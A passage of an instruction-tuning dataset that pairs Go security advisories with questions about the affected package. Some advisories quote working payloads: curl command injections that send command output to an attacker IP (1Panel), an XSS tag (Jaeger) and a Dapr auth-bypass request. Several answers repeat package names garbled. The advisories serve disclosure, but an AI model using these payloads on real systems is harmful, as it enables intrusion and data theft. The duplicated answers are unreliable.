reads.\n\n### Patches\nPatch is in progress.  https://github.com/spinnaker/echo/pull/1316\n\n### Workarounds\nDisable GH Status Notifications.  Filter your logs for Echo log data.  Use read-only tokens that are limited in scope.\n\n### References\nsig-security in slack: https://spinnakerteam.slack.com/archives/CFN8F5UR2\n. Top 1 search result is go:github.com/go-aah/aah. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/spinnaker/spinnaker github.com/spinnaker/spinnaker github.com/spinnaker/spinnaker github.com/spinnaker/spinnaker."}]}, {"id": "GHSA-8j3v-68w3-3848", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: In Gitea through 1.17.1, repo cloning can occur in the migration function.. Top 1 search result is go:github.com/hashicorp/nomad. What is the affected package?"}, {"from": "gpt", "value": "The affected package is code.gitea.io/gitea."}]}, {"id": "GHSA-8x8h-hcq8-jwwx", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact \nHardcoded DNS key usage has been found in Netmaker allowing unauth users to interact with DNS API endpoints.\n\n### Patches\nIssue is patched in 0.17.1, and fixed in 0.18.6+. \n\nIf Users are using 0.17.1, they should run \"docker pull gravitl/netmaker:v0.17.1\" and \"docker-compose up -d\". This will switch them to the patched users\n\nIf users are using v0.18.0-0.18.5, they should upgrade to v0.18.6 or later.\n\n### Workarounds\nIf using 0.17.1, can just pull the latest docker image of backend and restart server.\n\n### References\nCredit to Project Discovery, and in particular https://github.com/rootxharsh , https://github.com/iamnoooob, and https://github.com/projectdiscovery\n. Top 1 search result is go:github.com/helm/helm. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/gravitl/netmaker github.com/gravitl/netmaker."}]}, {"id": "GHSA-wmg5-g953-qqfw", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: When using the Vault and Vault Enterprise (Vault) approle auth method, any authenticated user with access to the `/auth/approle/role/:role_name/secret-id-accessor/destroy` endpoint can destroy the secret ID of any other role by providing the secret ID accessor. This vulnerability, CVE-2023-24999, has been fixed in Vault 1.13.0, 1.12.4, 1.11.8, 1.10.11 and above.. Top 1 search result is go:github.com/pion/dtls. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/vault github.com/hashicorp/vault github.com/hashicorp/vault."}]}, {"id": "GHSA-4fgv-8448-gf82", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: In Zinc, versions v0.1.9 through v0.3.1 are vulnerable to Stored Cross-Site Scripting when using the delete user functionality. When an authenticated user deletes a user having a XSS payload in the user id field, the javascript payload will be executed and allow an attacker to access the user\u2019s credentials.. Top 1 search result is go:github.com/miekg/dns. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/zincsearch/zincsearch github.com/zinclabs/zinc."}]}, {"id": "GHSA-mvj3-qrqh-cjvr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nAn internal modification to the way struct `PeerState` is serialized to JSON introduced a deadlock when new function MarshallJSON is called. This function can be called from two places:\n\n1. Via logs\n    * Setting the `consensus` logging module to \"debug\" level (should not happen in production), and\n    * Setting the log output format to JSON\n2. Via RPC `dump_consensus_state` \n\nCase 1 above, which should not be hit in production, will eventually hit the deadlock in most goroutines, effectively halting the node.\n\nIn case 2, only the data structures related to the first peer will be deadlocked, together with the thread(s) dealing with the RPC request(s). This means that only one of the channels of communication to the node's peers will be blocked. Eventually the peer will timeout and excluded from the list (typically after 2 minutes). The goroutines involved in the deadlock will not be garbage collected, but they will not interfere with the system after the peer is excluded.\n\nThe theoretical worst case for case 2, is a network with only two validator nodes. In this case, each of the nodes only has one `PeerState` struct. If `dump_consensus_state` is called in either node (or both), the chain will halt until the peer connections time out, after which the nodes will reconnect (with different `PeerState` structs) and the chain will progress again. Then, the same process can be repeated.\n\nAs the number of nodes in a network increases, and thus, the number of peer struct each node maintains, the possibility of reproducing the perturbation visible with 2 nodes decreases. Only the first `PeerState` struct will deadlock, and not the others (RPC `dump_consensus_state` accesses them in a for loop, so the deadlock at the first iteration causes the rest of the iterations of that \"for\" loop to never be reached).\n\nThis regression was introduced in versions `v0.34.28` and `v0.37.1`, and will be fixed in `v0.34.29` and `v0.37.2`.\n\n### Patches\nThe PR containing the fix is [here](https://github.com/cometbft/cometbft/pull/865), and the corresponding issue is [here](https://github.com/cometbft/cometbft/pull/863)\n\n### Workarounds\nFor case 1 (hitting the deadlock via logs)\n* either don't set the log output to \"json\", leave at \"plain\",\n* or don't set the consensus logging module to \"debug\", leave it at \"info\" or higher.\n\nFor case 2 (hitting the deadlock via RPC `dump_consensus_state`)\n* do not expose `dump_consensus_state` RPC endpoint to the public internet (e.g., via rules in your nginx setup)\n\n### References\n\n* [Issue](https://github.com/cometbft/cometbft/pull/863) that introduced the deadlock\n* [Issue](https://github.com/cometbft/cometbft/pull/524) reporting the bug via logs\n. Top 1 search result is go:github.com/ipfs/go-ipfs. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cometbft/cometbft github.com/cometbft/cometbft."}]}, {"id": "GHSA-cf6v-9j57-v6r6", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Open Redirect in GitHub repository go-gitea/gitea prior to 1.19.4. This is most likely a post-auth redirect plus it is a POST based request scenario, so less likely that can be exploited or chained with other bugs that can cause phishing or credential theft.. Top 1 search result is go:github.com/helm/helm. What is the affected package?"}, {"from": "gpt", "value": "The affected package is code.gitea.io/gitea."}]}, {"id": "GHSA-p9xf-74xh-mhw5", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nAn OS command injection vulnerability exists in 1Panel firewall functionality. A specially-crafted HTTP request can lead to arbitrary command execution. An attacker can make an authenticated HTTP request to trigger this vulnerability.\n\n### Details\n1Panel firewall functionality `/hosts/firewall/ip` endpoint read user input without validation, the attacker extends the default functionality of the application, which execute system commands.\n\n### PoC\nthe payload `; sleep 3 #` will lead server response in 3 seconds \n![image](https://user-images.githubusercontent.com/4935500/252299676-bc4a8b92-e475-40ee-a92a-fec9fad7a6c3.png)\n\nthe payload `; sleep 6 #` will lead server response in 6 seconds \n![image](https://user-images.githubusercontent.com/4935500/252299871-766cc411-69e5-4c6c-b4ff-7774fa974ea0.png)\n\n### Impact\nAn attacker can execute arbitrary code on the target system, which can lead to a complete compromise of the system.\n\n### Patches\n\nThe vulnerability has been fixed in v1.4.3.\n\n### Workarounds\n\nIt is recommended to upgrade the version to v1.4.3.\n\n### References\n\nIf you have any questions or comments about this advisory:\n\nOpen an issue in https://github.com/1Panel-dev/1Panel\nEmail us at wanghe@fit2cloud.com\n. Top 1 search result is go:go.mongodb.org/mongo-driver. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/1Panel-dev/1Panel."}]}, {"id": "GHSA-2w8w-qhg4-f78j", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Related UI vulnerability advisory: https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r\n\n### Summary\nJaeger UI is using the `json-markup` dependency to display span attributes and resources. This dependency is not sanitising keys of an object though, thus the `KeyValuesTable` is vulnerable to XSS. \n\n### Details\nThe vulnerable line is here: https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49\n\n### PoC\n\n1. Start a Jaeger UI\n2. Save the following trace as a file:\n```json\n{\n    \"data\": [\n        {\n            \"traceID\": \"076ef819cc06c45a\",\n            \"spans\": [\n                {\n                    \"traceID\": \"076ef819cc06c45a\",\n                    \"spanID\": \"076ef819cc06c45a\",\n                    \"flags\": 1,\n                    \"operationName\": \"and open 'attributes'\",\n                    \"references\": [],\n                    \"startTime\": 1678196149232010,\n                    \"duration\": 13485,\n                    \"tags\": [\n                        {\n                            \"key\": \"sampler.type\",\n                            \"type\": \"string\",\n                            \"value\": \"{\\\"<img src=x onerror=alert(1)>\\\":\\\"test\\\"}\"\n                        }\n                    ],\n                    \"logs\": [],\n                    \"processID\": \"p1\",\n                    \"warnings\": null\n                }\n            ],\n            \"processes\": {\n                \"p1\": {\n                    \"serviceName\": \"click here\",\n                    \"tags\": [\n                    ]\n                }\n            },\n            \"warnings\": null\n        }\n    ],\n    \"total\": 0,\n    \"limit\": 0,\n    \"offset\": 0,\n    \"errors\": null\n}\n```\n3. Upload that trace to Jaeger UI in order to visualise it.\n4. Open the trace, open it's span's attributes.\n5. XSS should be fired.\n\n### Impact\n\nThis is a XSS on Jaeger UI. XSS can be used to run JavaScript.\n. Top 1 search result is go:github.com/google/fscrypt. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/jaegertracing/jaeger."}]}, {"id": "GHSA-7j6x-42mm-p7jm", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: In Zinc, versions v0.1.9 through v0.3.1 are vulnerable to Stored Cross-Site Scripting when using the delete template functionality. When an authenticated user deletes a template with a XSS payload in the name field, the Javascript payload will be executed and allow an attacker to access the user\u2019s credentials.. Top 1 search result is go:github.com/helm/helm. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/zincsearch/zincsearch github.com/zinclabs/zinc."}]}, {"id": "GHSA-9mh8-9j64-443f", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: HashiCorp Vault and Vault Enterprise\u2019s TLS certificate auth method did not initially load the optionally configured CRL issued by the role's CA into memory on startup, resulting in the revocation list not being checked if the CRL has not yet been retrieved. Fixed in 1.12.0, 1.11.4, 1.10.7, and 1.9.10.. Top 1 search result is go:tailscale.com/cmd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/vault github.com/hashicorp/vault github.com/hashicorp/vault."}]}, {"id": "GHSA-9vrm-v9xv-x3xr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: HashiCorp Boundary from 0.10.0 through 0.11.2 contain an issue where when using a PKI-based worker with a Key Management Service (KMS) defined in the configuration file, new credentials created after an automatic rotation may not have been encrypted via the intended KMS. This would result in the credentials being stored in plaintext on the Boundary PKI worker\u2019s disk. This issue is fixed in version 0.12.0.. Top 1 search result is go:github.com/ethereum/go-ethereum. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/boundary."}]}, {"id": "GHSA-j494-7x2v-vvvp", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nWhen executing a relayed transaction, if the inner transaction failed, it would have increased the inner transaction's sender account nonce. This could have contributed to a limited DoS attack on a targeted account. The fix is a breaking change so a new flag `RelayedNonceFixEnableEpoch` was needed. This was a strict processing issue while validating blocks on a chain.\n\n### Patches\nv1.4.17 and later versions contain the fix for this issue\n\n### Workarounds\nthere were no workarounds for this issue. The affected account could only wait for the DoS attack to finish as the attack was not free or to attempt to send transactions in a very fast manner so as to compete on the same nonce with the attacker.\n\n### References\nFor the future understanding of this issue, on v1.4.17 and onwards versions, we have this integration test that addresses the issue and tests the fix. \nhttps://github.com/multiversx/mx-chain-go/blob/babdb144f1316ab6176bf3dbd7d4621120414d43/integrationTests/vm/txsFee/relayedMoveBalance_test.go#LL165C14-L165C14\n. Top 1 search result is go:github.com/ecnepsnai/web. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/multiversx/mx-chain-go."}]}, {"id": "GHSA-87f6-8gr7-pc6h", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nhttp://kube.pi/kubepi/api/v1/users/search?pageNum=1&&pageSize=10 leak password of any user (including admin). This leads to password crack attack\n\n\n### PoC\nhttps://drive.google.com/file/d/1ksdawJ1vShRJyT3wAgpqVmz-Ls6hMA7M/preview\n\n### Impact\n- Leaking confidential information.\n- Can lead to password cracking attacks\n. Top 1 search result is go:github.com/square/go-jose. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/KubeOperator/kubepi."}]}, {"id": "GHSA-59m6-82qm-vqgj", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\n\n\nA vulnerability has been found in Dapr that allows bypassing [API token authentication](https://docs.dapr.io/operations/security/api-token/), which is used by the Dapr sidecar to authenticate calls coming from the application, with a well-crafted HTTP request.\n\n\nUsers who leverage API token authentication are encouraged to upgrade Dapr to 1.10.9 and 1.11.2.\n\n\n### Impact\n\n\nThis vulnerability impacts Dapr users who have configured API token authentication. An attacker could craft a request that is always allowed by the Dapr sidecar over HTTP, even if the `dapr-api-token` in the request is invalid or missing.\n\n\n### Patches\n\n\nThe issue has been fixed in Dapr 1.10.9 and 1.11.2.\n\n\n### Details\n\n\nWhen API token authentication is enabled, Dapr requires all calls from applications to include the `dapr-api-token` header, with a value matching what's included in the Dapr's configuration. In order to allow for healthchecks to work, the `/v1.0/healthz` and `/v1.0/healthz/outbound` HTTP APIs are excluded from the API token authentication check, and are always allowed.\n\n\nDapr <= 1.10.8 and <= 1.11.1 implemented the allowlisting of the healthcheck endpoints by permitting all requests whose URL contains `/healthz` to bypass the API token authentication check. The match applied anywhere in the URL, including the querystring.\n\n\nAs a consequence, attackers were able to bypass API token authentication by including `/healthz` anywhere in the URL, including as a querystring parameter. This allowed attackers to invoke any Dapr API using HTTP, including perform service invocation.\n\n\n### Proof of Concept\n\n\n```\n$ curl -v http://localhost:3500/v1.0/metadata\n* Trying ::1:3500...\n* Connected to localhost (::1) port 3500 (#0)\n> GET /v1.0/metadata HTTP/1.1\n> Host: localhost:3500\n> User-Agent: curl/7.74.0\n> Accept: */*\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 401 Unauthorized\n< Date: Mon, 17 Jul 2023 18:13:13 GMT\n< Content-Type: text/plain; charset=utf-8\n< Content-Length: 17\n< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00\n<\n* Connection #0 to host localhost left intact\ninvalid api token\n\n\n$ curl -v http://localhost:3500/v1.0/metadata -H \"dapr-api-token: mytoken\"\n* Trying ::1:3500...\n* Connected to localhost (::1) port 3500 (#0)\n> GET /v1.0/metadata HTTP/1.1\n> Host: localhost:3500\n> User-Agent: curl/7.74.0\n> Accept: */*\n> dapr-api-token: mytoken\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Date: Mon, 17 Jul 2023 18:13:26 GMT\n< Content-Type: application/json\n< Content-Length: 119\n< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00\n<\n* Connection #0 to host localhost left intact\n{\"id\":\"foo\",\"actors\":[],\"extended\":{\"daprRuntimeVersion\":\"v1.11.1\"},\"components\":[],\"httpEndpoints\":[],\"subscriptions\":[]}\n\n\n$ curl -v http://localhost:3500/v1.0/metadata?foo=/healthz\n* Trying ::1:3500...\n* Connected to localhost (::1) port 3500 (#0)\n> GET /v1.0/metadata?foo=/healthz HTTP/1.1\n> Host: localhost:3500\n> User-Agent: curl/7.74.0\n> Accept: */*\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Date: Mon, 17 Jul 2023 18:13:44 GMT\n< Content-Type: application/json\n< Content-Length: 119\n< Traceparent: 00-00000000000000000000000000000000-0000000000000000-00\n<\n* Connection #0 to host localhost left intact\n{\"id\":\"foo\",\"actors\":[],\"extended\":{\"daprRuntimeVersion\":\"v1.11.1\"},\"components\":[],\"httpEndpoints\":[],\"subscriptions\":[]}\n. Top 1 search result is go:github.com/sylabs/singularity. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/dapr/dapr github.com/dapr/dapr."}]}, {"id": "GHSA-vjh7-5r6x-xh6g", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nUnauthenticated attackers can execute arbitrary commands as `root` on CasaOS instances.\n\n### Patches\n\nThe problem was addressed by improving the detection of client IP addresses in 391dd7f. This patch is part of CasaOS 0.4.4.\n\n### Workarounds\n\nUsers should upgrade to CasaOS 0.4.4. If they can't, they should temporarily restrict access to CasaOS to untrusted users, for instance by not exposing it publicly. \n\n### References\n\n- 391dd7f\n- https://www.sonarsource.com/blog/security-vulnerabilities-in-casaos/. Top 1 search result is go:github.com/hashicorp/vault. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/IceWhaleTech/CasaOS-Gateway."}]}, {"id": "GHSA-68p4-95xf-7gx8", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nAn high-privileged user could create a Package referencing an arbitrarily large image containing that Crossplane would then parse, possibly resulting in exhausting all the available memory and therefore in the container being OOMKilled.\n\nThe impact is low due to the high privileges required to be able to create the Package and the eventually consistency nature of controller.\n\n### Patches\n\nThe problem has been fixed in 1.11.5, 1.12.3 and 1.13.0, all the supported versions of Crossplane at the time of writing.\n\n### Workarounds\n\nOnly using images from trusted sources and keeping Package editing/creating privileges to administrators only, which should be both considered already best practices.\n\n### References\n\nSee `ADA-XP-23-16` in the Security Audit's [report](https://github.com/crossplane/crossplane/blob/ac8b24fe739c5d942ea885157148497f196c3dd3/security/ADA-security-audit-23.pdf).\n\n### Credits\n\nThis was reported as `ADA-XP-23-16` by @AdamKorcz and @DavidKorczynski from Ada Logic and facilitated by OSTIF as part of the Security Audit sponsored by CNCF.. Top 1 search result is go:github.com/gopistolet/gopistolet. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/crossplane/crossplane github.com/crossplane/crossplane."}]}, {"id": "GHSA-hhvx-8755-4cvw", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: A vulnerability was identified in Nomad and Nomad Enterprise (\u201cNomad\u201d) such that a deny ACL capability could not be applied to a workload\u2019s own variables. If included, the Nomad ACL system will silently fail to block access. This vulnerability, CVE-2023-1296, was fixed in Nomad 1.4.6 and 1.5.1.. Top 1 search result is go:github.com/navidrome/navidrome. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/nomad github.com/hashicorp/nomad."}]}, {"id": "GHSA-j2cr-jc39-wpx5", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nIn `PeriodicVestingAccount`, defined in `x/auth`, an attacker can initialize a victim's account as a malicious vesting account, which allows deposits but does not allow withdrawals. When the user then deposits funds into their account, those funds are locked forever, and the user is not able to withdraw them.\n\n### Patches\n\n\\>= v0.46.13 for Cosmos SDK v0.46.x\n\\>= v0.47.3 for Cosmos SDK v0.47.x\n\nIf a network backported periodic vesting accounts to earlier versions of the SDK, those networks are affected too.\n\n### Workarounds\n\nThere is no workaround for this issue. Upgrade immediately.\n\n### References\n\n* Patched versions release notes: [v0.47.3](https://github.com/cosmos/cosmos-sdk/blob/cfc757dc5043fb2758c47c146d2912fd010c1a45/RELEASE_NOTES.md#cosmos-sdk-v0473-release-notes), [v0.46.13](https://github.com/cosmos/cosmos-sdk/blob/d4b7164de5d8391e6aa644d8ea84e07396dd9653/RELEASE_NOTES.md#cosmos-sdk-v04613-release-notes).\n* [Forum Post](https://forum.cosmos.network/t/cosmos-sdk-security-advisory-barberry/10825). Top 1 search result is go:github.com/foxcpp/maddy. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cosmos/cosmos-sdk github.com/cosmos/cosmos-sdk."}]}, {"id": "GHSA-q2mx-gpjf-3h8x", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nThe authenticated attacker can craft a malicious payload to achieve command injection when adding container repositories.\n\n1. Vulnerability analysis.\n\n```\nbackend\\app\\api\\v1\\image_repo.go#create\n```\n![image](https://user-images.githubusercontent.com/46734380/249118560-8c20dac6-d1be-49d2-b2b2-9a4df9b7cd04.png)\n\n```\nbackend\\app\\service\\image_repo.go#CheckConn\n```\n![image](https://user-images.githubusercontent.com/46734380/249118639-37b7a1e9-08a9-4316-8beb-39beefdceb33.png)\n\n2. vulnerability reproduction.\n\n```\nPOST /api/v1/containers/repo HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-CSRF-TOKEN: \nContent-Length: 446\nOrigin: http://192.168.109.152:40982\nConnection: close\nReferer: http://192.168.109.152:40982/containers/repo\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\n```\n\n```\n{\"id\":2,\"createdAt\":\"2023-04-13T19:57:43.633643247-07:00\",\"name\":\"asdasd\",\"downloadUrl\":\"127.0.0.1:8080\",\"protocol\":\"http\",\"username\":\"admin||curl http://192.168.109.1:12345/`ls`||\",\"auth\":true,\"status\":\"Failed\",\"message\":\"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\\nError response from daemon: Get \\\"http://127.0.0.1:8080/v2/\\\": dial tcp 127.0.0.1:8080: connect: connection refused\\n\",\"password\":\"Passw0rd\"}\n```\n\n3. Using update can be triggered multiple times.\n\n```\nPOST /api/v1/containers/repo/update HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-CSRF-TOKEN: \nContent-Length: 447\nOrigin: http://192.168.109.152:40982\nConnection: close\nReferer: http://192.168.109.152:40982/containers/repo\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\n```\n\n```\n{\"id\":2,\"createdAt\":\"2023-04-13T19:57:43.633643247-07:00\",\"name\":\"asdasd\",\"downloadUrl\":\"127.0.0.1:8080\",\"protocol\":\"http\",\"username\":\"admin||curl http://192.168.109.1:12345/`pwd`||\",\"auth\":true,\"status\":\"Failed\",\"message\":\"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\\nError response from daemon: Get \\\"http://127.0.0.1:8080/v2/\\\": dial tcp 127.0.0.1:8080: connect: connection refused\\n\",\"password\":\"Passw0rd\"}\n```\n\nAffected versions: <= 1.3.5\n\n### Patches\n\nThe vulnerability has been fixed in v1.3.6.\n\n### Workarounds\n\nIt is recommended to upgrade the version to v1.3.6.\n\n### References\n\nIf you have any questions or comments about this advisory:\n\nOpen an issue in https://github.com/1Panel-dev/1Panel\nEmail us at wanghe@fit2cloud.com\n. Top 1 search result is go:github.com/cosmos/cosmos-sdk. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/1Panel-dev/1Panel."}]}, {"id": "GHSA-f28g-86hc-823q", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nAuthorized clients, having an `inject_processor` secret, could brute-force the secret token value by abusing the `fmt` parameter to the `Proxy-Tokenizer` header.\n\n### Patches\n\nThis was fixed in https://github.com/superfly/tokenizer/pull/8 and further mitigated in https://github.com/superfly/tokenizer/pull/9.. Top 1 search result is go:github.com/tidwall/gjson. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/superfly/tokenizer."}]}, {"id": "GHSA-757p-vx43-fp9r", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nA normal user has permission to create/update users, they can become admin by editing the `isadmin` value in the request\n\n\n### PoC\nChange the value of the `isadmin` field in the request to true:\nhttps://drive.google.com/file/d/1e8XJbIFIDXaFiL-dqn0a0b6u7o3CwqSG/preview\n\n### Impact\nElevate user privileges\n. Top 1 search result is go:github.com/containerd/containerd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/KubeOperator/kubepi."}]}, {"id": "GHSA-w24w-wp77-qffm", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nThe mempool maintains two data structures to keep track of outstanding transactions: a list and a map.\nThese two data structures are supposed to be in sync all the time in the sense that the map tracks the index (if any) of the transaction in the list. \n\nUnfortunately, it is possible to have them out of sync. When this happens, the list may contain several copies of the same transaction.\nBecause the map tracks a single index, it is then no longer possible to remove all the copies of the transaction from the list.\nThis happens  even if the duplicated transaction is later committed in a block.\nThe only way to remove the transaction is by restarting the node.\n\nThese are the steps to cause the above duplication problem. Everything should happen within one height, that is no `FinalizeBlock` or `BeginBlock` ABCI calls should happen while these steps are reproduced:\n\n1. send transaction tx1 to the target full node via RPC\n2. send N more different transactions to the target full node, where N should be higher than the node's configured value for `cache_size` in `config.toml`\n3. send transaction tx1 again to the target full node\n\nOne of the copies of tx1 is now _stuck_ in the mempool's data structures. Effectively causing a memory leak, and having that node gossiping that transaction to its peers forever.\n\nThe above problem can be repeated on and on until a sizable number of transactions are stuck in the mempool, in order to try to bring down the target node.\n\nThis problem is present in releases: `v0.37.0`, and `v0.37.1`, as well as in `v0.34.28`, and all previous releases of the CometBFT repo. It will be fixed in releases `v0.34.29` and `v0.37.2`.\n\n### Patches\n\nThe PR containing the fix is [here](https://github.com/cometbft/cometbft/pull/890).\n\n\n### Workarounds\n\n* Increasing the value of `cache_size` in `config.toml` makes it very difficult to effectively attack a full node.\n* Not exposing the transaction submission RPC's would mitigate the probability of a successful attack, as the attacker would then have to create a modified (byzantine) full node to be able to perform the attack via p2p.\n\n### References\n\n* [PR](https://github.com/tendermint/tendermint/pull/2778) that introduced the map to track transactions in the mempool.\n* [PR](https://github.com/cometbft/cometbft/pull/890) containing the fix.\n. Top 1 search result is go:code.vegaprotocol.io/vega. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cometbft/cometbft github.com/cometbft/cometbft."}]}, {"id": "GHSA-mmx5-32m4-wxvx", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nFix https://github.com/apptainer/apptainer/pull/1523 included in Apptainer 1.2.0-rc.2 has introduced an ineffective privilege drop when requesting container network setup, therefore subsequent functions are called with root privileges.  The attack surface is rather limited for users but an attacker could possibly craft a starter config to delete any directory on the host filesystems.  Only affects setuid installations of Apptainer.  \n\n### Patches\n\nThe security fix https://github.com/apptainer/apptainer/pull/1578 has been included in Apptainer 1.2.1\n\n### Workarounds\n\nThere is no known workaround outside of upgrading to Apptainer 1.2.1. Top 1 search result is go:github.com/apache/trafficcontrol. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/apptainer/apptainer."}]}, {"id": "GHSA-pj4x-2xr5-w87m", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nCrossplanes image backend does not validate the byte contents of Crossplane packages. As such, Crossplane does not detect if an attacker has tampered with a Package.\n\n### Patches\n\nThe problem has been fixed in 1.11.5, 1.12.3 and 1.13.0, all the supported versions of Crossplane at the time of writing.\n\n### Workarounds\n\nOnly using images from trusted sources and keeping Package editing/creating privileges to administrators only, which should be both considered already best practices.\n\n### References\n\nSee `ADA-XP-23-11` in the Security Audit's [report](https://github.com/crossplane/crossplane/blob/ac8b24fe739c5d942ea885157148497f196c3dd3/security/ADA-security-audit-23.pdf).\n\n### Credits\n\nThis was reported as `ADA-XP-23-11` by @AdamKorcz and @DavidKorczynski from Ada Logic and facilitated by OSTIF as part of the Security Audit sponsored by CNCF.. Top 1 search result is go:github.com/grafana/grafana. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/crossplane/crossplane github.com/crossplane/crossplane."}]}, {"id": "GHSA-qc2g-gmh6-95p4", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Users may be able to launch containers using images that are restricted by ImagePolicyWebhook when using ephemeral containers. Kubernetes clusters are only affected if the ImagePolicyWebhook admission plugin is used together with ephemeral containers.\n\n. Top 1 search result is go:github.com/hashicorp/vault. What is the affected package?"}, {"from": "gpt", "value": "The affected package is k8s.io/kubernetes k8s.io/kubernetes k8s.io/kubernetes k8s.io/kubernetes."}]}, {"id": "GHSA-7x2c-fgx6-xf9h", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nThe authenticated attacker can craft a malicious payloads to achieve command injection when entering the container terminal.\n\n1. Vulnerability analysis.\n\n```\nbackend\\app\\api\\v1\\terminal.go#ContainerWsSsh\n```\n![image](https://user-images.githubusercontent.com/46734380/249119420-045ec192-250d-4d07-a69e-0bd794cddec7.png)\n\n2. vulnerability reproduction.\n\n```\nGET /api/v1/containers/exec?cols=80&rows=24&containerid=/bin/bash||curl%20http://192.168.109.1:12345/`whoami`||&user=asd&command=/bin/bash HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nSec-WebSocket-Version: 13\nOrigin: http://192.168.109.152:40982\nSec-WebSocket-Key: cOEWTRgkjxVppuhzAfOUWQ==\nConnection: keep-alive, Upgrade\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\nPragma: no-cache\nCache-Control: no-cache\nUpgrade: websocket\n```\n\n3. The successful execution of system commands.\n![image](https://user-images.githubusercontent.com/46734380/249119520-ed2dcc32-be4a-45d8-9286-f9fb778e87da.png)\n\nAffected versions: <= 1.3.5\n\n### Patches\n\nThe vulnerability has been fixed in v1.3.6.\n\n### 